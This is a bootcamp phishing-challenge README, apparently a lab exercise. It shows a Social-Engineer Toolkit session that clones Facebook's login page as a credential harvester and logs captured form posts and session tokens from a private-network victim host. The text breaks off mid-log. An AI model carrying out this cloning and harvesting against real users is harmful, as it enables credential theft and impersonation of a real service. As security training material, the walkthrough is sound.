# cibersecurity-desafio-phishing
Desafio Bootcamp cibersecurity-desafio-phishing

![Screenshot_1](https://github.com/user-attachments/assets/8584e949-3641-4136-95ed-d3143880e4b5)






                          _                                           J
                         /-\                                          J
                    _____|#|_____                                     J
                   |_____________|                                    J
                  |_______________|                                   E
                 ||_POLICE_##_BOX_||                                  R
                 | |-|-|-|||-|-|-| |                                  O
                 | |-|-|-|||-|-|-| |                                  N
                 | |_|_|_|||_|_|_| |                                  I
                 | ||~~~| | |---|| |                                  M
                 | ||~~~|!|!| O || |                                  O
                 | ||~~~| |.|___|| |                                  O
                 | ||---| | |---|| |                                  O
                 | ||   | | |   || |                                  O
                 | ||___| | |___|| |                                  !
                 | ||---| | |---|| |                                  !
                 | ||   | | |   || |                                  !
                 | ||___| | |___|| |                                  !
                 |-----------------|                                  !
                 |   Timey Wimey   |                                  !
                 -------------------                                  !

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]                 
[---]        Follow me on Twitter: @HackingDave        [---]                 
[---]       Homepage: https://www.trustedsec.com       [---]                 
        Welcome to the Social-Engineer Toolkit (SET).                        
         The one stop shop for all of your SE needs.                         
                                                                             
   The Social-Engineer Toolkit is a product of TrustedSec.                   
                                                                             
           Visit: https://www.trustedsec.com                                 
                                                                             
   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!            
                                                                             
                                                                             
 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 2

The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.

The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.

The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.

The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.

The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.

The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.

The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.

The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu

set:webattack>3

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.
   
   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack>2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

-------------------------------------------------------------------------------
--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---

The way that this works is by cloning a site and looking for form fields to
rewrite. If the POST fields are not usual methods for posting forms this 
could fail. If it does, you can always save the HTML, rewrite the forms to
be standard forms and use the "IMPORT" feature. Additionally, really 
important:

If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
IP address below, not your NAT address. Additionally, if you don't know
basic networking concepts, and you have a private IP address, you will
need to do port forwarding to your NAT IP address from your external IP
address. A browser doesns't know how to communicate with a private IP
address, so if you don't specify an external IP address if you are using
this from an external perpective, it will not work. This isn't a SET issue
this is how networking works.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.10.109]:
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone:http://www.facebook.com

[*] Cloning the website: https://login.facebook.com/login.php                
[*] This could take a little bit...                                          

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                  
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                               
[*] Information will be displayed to you as it arrives below:                
192.168.10.106 - - [07/Jan/2025 17:31:42] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryy6lWkAVyvTMftPlO      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736281904652                                                                
------WebKitFormBoundaryy6lWkAVyvTMftPlO                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"user":"0","webSessionId":"xqe2qj:8f8sw2:gg542j","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"b11104ce-d769-4811-8a69-f1eaabc632ab\",\"ct\":1659080345,\"sjd\":\"kTSLbudWxDRQOfV4q+6h/LcceTG4zt/XIkiNydLMpPvn0LUVwsiSZo5Emb8uJyqmtJ4w39boMmNllx77WovVIMJW1IESlqXNzU/luG2cw+BIGsa08mxfEj2TI2oZ6zPQnIPfV0fNcPhZiTu/hYmluA==\",\"sid\":-1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"xqe2qj:8f8sw2:gg542j","t":1736281860764.3,"b":[1,128]},1736281904652.3,0,512]],"trigger":"falco:bd_pdc_signals"}]              
------WebKitFormBoundaryy6lWkAVyvTMftPlO--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:31:43] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=1&__rev=1019191350&__s=xqe2qj%3A8f8sw2%3Agg542j&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundarysazWKaJLGfUqUSsr      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736281905682                                                                
------WebKitFormBoundarysazWKaJLGfUqUSsr                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"b11104ce-d769-4811-8a69-f1eaabc632ab\",\"ct\":1659080345,\"sjd\":\"kTSLbudWxDRQOfV4q+6h/LcceTG4zt/XIkiNydLMpPvn0LUVwsiSZo5Emb8uJyqmtJ4w39boMmNllx77WovVIMJW1IESlqXNzU/luG2cw+BIGsa08mxfEj2TI2oZ6zPQnIPfV0fNcPhZiTu/hYmluA==\",\"sid\":-1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"xqe2qj:8f8sw2:gg542j","t":1736281860764.3,"b":[1,128]},1736281904652.3,1,512],["falco:web_blue_time_spent_navigation",{"e":"{\"json_data\":\"{\\\"source_path\\\":null,\\\"source_token\\\":null,\\\"dest_path\\\":\\\"XWebLoginController\\\",\\\"dest_token\\\":\\\"96e88af3\\\",\\\"impression_id\\\":\\\"1zB83NHoOGgDJ39Z4\\\",\\\"cause\\\":\\\"load\\\",\\\"sid_raw\\\":\\\"xqe2qj:8f8sw2:gg542j\\\",\\\"referrer\\\":\\\"\\\",\\\"dest_ef_page\\\":null,\\\"dest_uri\\\":\\\"https://www.facebook.com/login.php\\\"}\"}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"xqe2qj:8f8sw2:gg542j","t":1736281860812.5,"b":[1,128]},1736281904664.9001,0,653],["falco:bd_pdc_signals",{"e":"{\"asid\":\"b11104ce-d769-4811-8a69-f1eaabc632ab\",\"ct\":1659080345,\"sjd\":\"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\",\"sid\":-1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"xqe2qj:8f8sw2:gg542j","t":1736281860820.2,"b":[1,128]},1736281904672.6,0,2440],["falco:web_perf_device_info_log",{"e":"{\"cpu_cores\":2,\"ram\":null,\"gpu_renderer\":\"ANGLE (Intel, Intel(R) UHD Graphics (0x00009A78) Direct3D11 vs_5_0 ps_5_0, D3D11)\",\"gpu_vendor\":\"Google Inc. (Intel)\"}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"xqe2qj:8f8sw2:gg542j","t":1736281860833.4,"b":[1,128]},1736281904685.9001,0,439]],"user":"0","webSessionId":"xqe2qj:8f8sw2:gg542j","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":""}]                        
------WebKitFormBoundarysazWKaJLGfUqUSsr--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:31:44] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=2&__rev=1019191350&__s=xqe2qj%3A8f8sw2%3Agg542j&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryvALMBdAXqiM4w3W6      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736281913685                                                                
------WebKitFormBoundaryvALMBdAXqiM4w3W6                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"lBLwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJiMTExMDRjZS1kNzY5LTQ4MTEtOGE2OS1mMWVhYWJjNjMyYWJcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/Cca1RTTGJ1ZFd4RFJRT2ZWNHErNmgvTGNjZVRHNHp0L1hJa2lOeWRMTXBQdm4wTFVWd3NpU1pvNUVtYjh1SnlxbXRKNHczOWJvTW1ObGx4NzdXb3ZWSU1KVzFJRVNscVhOelUvbHVHMmN3K0JJR3NhMDhteGZFajJUSTJvWjZ6UFFuSVBmVjBmTmNQaFppVHUvaFltbHVBPT1cIixcIgno9CABLTF9IiwiciI6MSwiZCI6IiRefEFjYjhVSEtqVlNBSDNOODE0aGJmRUpEVjk0cHhJNTNTU0FwVmdBUXo3LVB6X28tZDg1WGNkeWR3bkRVaHdDMDZXLXRid0g0QmNoZlo2QVlvbnVBdkxMMTFjNjhjfGZkLkFjYmpVak96QmlKS2o3WDBSSTNEeW4xZi02LWNWaF9JUWRlTUFOc25JeTZqdE9FY0pzLUpxWHpHMVJUc0c5NjNvd21xdkFDWHJaZFhzOEtua05yMEhnT1MiLCJzIjoieHFlMnFqOjhmOHN3MjpnZzU0MmoiLCJ0IjoxNzM2MjgxODYwNzY0LjMsImIiOlsxLDEyOF19LDE3MzYyODE5MDQ2NTIuMywyLDUxMl0sW00wMG9kc193ZWJfYmF0Y2hdLwUQJFwiOntcIjI5NjYJCkxtcy50aW1lX3NwZW50LnFhLnd3dwkaHRdEYml0cy5qc19pbml0aWFsaXplQXgQe1wiblwhjgRcIgEPNG51bGx9fX0sXCI3MTczCUQwZW50aXRpZXMuZmZfagWWAC42zgJALjI1NjI4MTA0MDU1OC4wLkMROQB2AY8MbG9nZy5rAAAyLmsACCxcIgkmYGluZm8udXBsb2FkX21ldGhvZC5iYW56YWkBQCBfY3JpdGljYWwJkUKxADZGAEo4ABFaJHByb2Nlc3Npbmd+SgAJi5q4ABlyDTiGaQAFtEZZASXzDGx1ZV85uShfbmF2aWdhdGlvbrZpAQAxymkBMGltbWVkaWF0ZWx5XCJSHQJibAEdO6IGARVNRm8BMr4ABSlWLgEscGVyZl9kZXZpY2VfQUUMX2xvZ/4oATUoytkBotMABH19/goF/goF/goFygoFHDU3NzYuNywiUgoFMDk2MjksMCwxMjQzXSzxOWESfQ0gYml0X2FycmF5vRQUc2lkX3JhgfIQXCJ4cWVCjgXlNhBzdGFydAVKge+pmiA5MDQsXCJ0b3MJUxxcIjpbMSwwXQ0UCGN1bQErDQ4IaWRc4WMAZ6XgBFwiDRYYbGVuXCI6OQ0OGHNlcVwiOjD+2AH+2AH+2AHK2AEMODgzMFbWAUQxMjY4Mi40MDAxLDAsNDEzXV0=","user":"0","webSessionId":"xqe2qj:8f8sw2:gg542j","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]               
------WebKitFormBoundaryvALMBdAXqiM4w3W6--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:31:52] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=3&__rev=1019191350&__s=xqe2qj%3A8f8sw2%3Agg542j&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=1                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=4                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=xqe2qj:8f8sw2:gg542j                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:31:53] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=1                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=5                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=xqe2qj:8f8sw2:gg542j                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:31:53] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=1                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=6                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=xqe2qj:8f8sw2:gg542j                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:31:54] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryjJTkZJEOQXvs3mhh      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736281934634                                                                
------WebKitFormBoundaryjJTkZJEOQXvs3mhh                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"user":"0","webSessionId":"xqe2qj:8f8sw2:gg542j","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"b11104ce-d769-4811-8a69-f1eaabc632ab\",\"ct\":1659080345,\"sjd\":\"kTSLbudWxDRQOfV4q+6h/D2mX7PI46wZ7dgZaqzI4C2FE8GEYpKOnKZYS39nrHxmpQlDYoG8t8d7TBYc1DBeUJpUbpEj+u8Mp+4/jR+Z4ZotlxZCQT6nnqUS3CXJBPzrSArPi5USqX8EX6WbIVceEg==\",\"sid\":-1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"xqe2qj:8f8sw2:gg542j","t":1736281890781.8,"b":[1,128]},1736281934634.1,0,512]],"trigger":"falco:bd_pdc_signals"}]              
------WebKitFormBoundaryjJTkZJEOQXvs3mhh--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:32:13] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=7&__rev=1019191350&__s=xqe2qj%3A8f8sw2%3Agg542j&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundarymW8kfhA6NcA8XAKv      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736281994652                                                                
------WebKitFormBoundarymW8kfhA6NcA8XAKv                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"yBLwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJiMTExMDRjZS1kNzY5LTQ4MTEtOGE2OS1mMWVhYWJjNjMyYWJcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/Cca1RTTGJ1ZFd4RFJRT2ZWNHErNmgvTGNjZVRHNHp0L1hJa2lOeWRMTXBQdm4wTFVWd3NpU1pvNUVtYjh1SnlxbXRKNHczOWJvTW1ObGx4NzdXb3ZWSU1KVzFJRVNscVhOelUvbHVHMmN3K0JJR3NhMDhteGZFajJUSTJvWjZ6UFFuSVBmVjBmTmNQaFppVHUvaFltbHVBPT1cIixcIgno9CABLTF9IiwiciI6MSwiZCI6IiRefEFjYjhVSEtqVlNBSDNOODE0aGJmRUpEVjk0cHhJNTNTU0FwVmdBUXo3LVB6X28tZDg1WGNkeWR3bkRVaHdDMDZXLXRid0g0QmNoZlo2QVlvbnVBdkxMMTFjNjhjfGZkLkFjYmpVak96QmlKS2o3WDBSSTNEeW4xZi02LWNWaF9JUWRlTUFOc25JeTZqdE9FY0pzLUpxWHpHMVJUc0c5NjNvd21xdkFDWHJaZFhzOEtua05yMEhnT1MiLCJzIjoieHFlMnFqOjhmOHN3MjpnZzU0MmoiLCJ0IjoxNzM2MjgxODYwNzY0LjMsImIiOlsxLDEyOF19LDE3MzYyODE5MDQ2NTIuMywzLDUxMl0sW00wMG9kc193ZWJfYmF0Y2hdLwUQJFwiOntcIjcxNzMJCjBlbnRpdGllcy5mZl9qBTgALgE8kHRpbWVfc3BlbnRfYml0X2FycmF5LjI1NjI4MTA0MDU1OC4wLkMRQyx2ZW50LmxvZ2dlZFwFXwRuXCGlBFwiAQ8cbnVsbH0sXCIJJmBpbmZvLnVwbG9hZF9tZXRob2QuYmFuemFpAUAsX2ltbWVkaWF0ZWx5kkkAVjsAEWAkcHJvY2Vzc2luZ35NAAmRYr4AAQH+egL+egL+egLCegIgNzM4NDAuNiwiTnoCRDE3NjkyLjkwMDEsMCw1ODddLP6tBO6tBImt8IFEMm1YN1BJNDZ3WjdkZ1phcXpJNEMyRkU4R0VZcEtPbktaWVMzOW5ySHhtcFFsRFlvRzh0OGQ3VEJZYzFEQmVVSnBVYnBFait1OE1wKzQvalIrWjRab3RseFpDUVQ2bm5xVVMzQ1hKQlB6clNBclBpNVVTcVg4RVg2V2JJVmNlRWc9/q0E/q0E/q0E/q0EHDkwNzgxLjgsUjMCLDM0NjM0LjEsMSw1Mf6tBJ2tNh0H/qMEhqMEHGNyaXRpY2FsflMEhemdoBE4AC6JbP6dBP6dBP6dBP6dBPqdBBA5NTc5N14XBzgzOTY0OS42LDAsNTcxXV0=","user":"0","webSessionId":"xqe2qj:8f8sw